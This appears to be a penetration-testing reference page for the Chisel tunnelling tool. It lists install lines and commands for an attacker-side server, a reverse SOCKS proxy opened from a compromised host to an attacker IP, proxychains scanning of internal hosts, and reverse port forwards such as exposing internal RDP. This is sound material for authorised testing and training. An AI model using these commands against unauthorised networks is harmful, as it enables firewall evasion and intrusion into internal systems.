# Chisel

> A fast TCP/UDP tunnel over HTTP secured with SSH, in a single Go binary — used to build SOCKS proxies and port forwards through firewalls during pivoting.

- Category: Pivoting & Tunneling
- Commands: 7
- Page: https://terminal.rokibulroni.com/tool/pivoting/chisel
- Homepage: https://github.com/jpillora/chisel
- Documentation: https://github.com/jpillora/chisel
- Tags: pivoting, tunneling, SOCKS, port forwarding

## Install

- brew: `brew install chisel`
- go: `go install github.com/jpillora/chisel@latest`

## Server (attacker)

### chisel server -p <port> --reverse

```bash
chisel server -p <port> --reverse
```

Example:

```bash
chisel server -p 8080 --reverse
```

Starts the chisel server and allows reverse tunnels initiated by clients.

### chisel server -p <port> --reverse --socks5

```bash
chisel server -p <port> --reverse --socks5
```

Example:

```bash
chisel server -p 8080 --reverse --socks5
```

Also enables SOCKS so clients can open a proxy back through you.


## Reverse SOCKS proxy

### chisel client <server>:<port> R:socks

```bash
chisel client <server>:<port> R:socks
```

Example:

```bash
chisel client 10.10.14.5:8080 R:socks
```

From a compromised host: opens a reverse SOCKS5 proxy on the server’s port 1080, giving you a route into the internal network.

### proxychains nmap -sT -Pn <internal-ip>

```bash
proxychains nmap -sT -Pn <internal-ip>
```

Example:

```bash
proxychains nmap -sT -Pn 172.16.0.10
```

Runs tools through the SOCKS proxy (set socks5 127.0.0.1 1080 in proxychains.conf).


## Port forwards

### chisel client <server>:<port> R:<rport>:<target>:<tport>

```bash
chisel client <server>:<port> R:<rport>:<target>:<tport>
```

Example:

```bash
chisel client 10.10.14.5:8080 R:3389:172.16.0.10:3389
```

Reverse forward: exposes an internal host’s port on the attacker machine.

### chisel client <server>:<port> <lport>:<target>:<tport>

```bash
chisel client <server>:<port> <lport>:<target>:<tport>
```

Example:

```bash
chisel client 10.10.14.5:8080 8000:172.16.0.10:80
```

Local forward: binds a port on the client to an internal service.

### chisel client --fingerprint <fp> <server>:<port> R:socks

```bash
chisel client --fingerprint <fp> <server>:<port> R:socks
```

Example:

```bash
chisel client --fingerprint AB:CD:... 10.10.14.5:8080 R:socks
```

Pins the server key to prevent a man-in-the-middle on the tunnel.

## Related tools

- [Ligolo-ng](https://terminal.rokibulroni.com/tool/pivoting/ligolo-ng)
- [ProxyChains-NG](https://terminal.rokibulroni.com/tool/pivoting/proxychains)
- [SSH](https://terminal.rokibulroni.com/tool/lateral/ssh)
- [socat](https://terminal.rokibulroni.com/tool/utilities/socat)
